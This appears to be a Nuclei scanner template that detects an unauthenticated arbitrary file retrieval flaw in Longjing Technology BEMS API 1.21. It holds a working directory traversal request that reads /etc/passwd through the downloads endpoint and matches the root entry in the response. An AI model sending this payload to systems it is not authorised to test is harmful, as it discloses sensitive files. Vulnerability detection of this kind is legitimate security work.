id: bems-api-lfi
info:
  author: gy741
  description: The application suffers from an unauthenticated arbitrary file retrieval
    vulnerability. Input passed through the fileName parameter through the downloads
    API endpoint is not properly verified before being used to download files. This
    can be exploited to disclose the contents of arbitrary and sensitive files through
    directory traversal attacks.
  name: Longjing Technology BEMS API 1.21 - Arbitrary File Retrieval
  reference:
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5657.php
  severity: high
  tags: lfi
requests:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/downloads?fileName=../../../../../../../../etc/passwd'
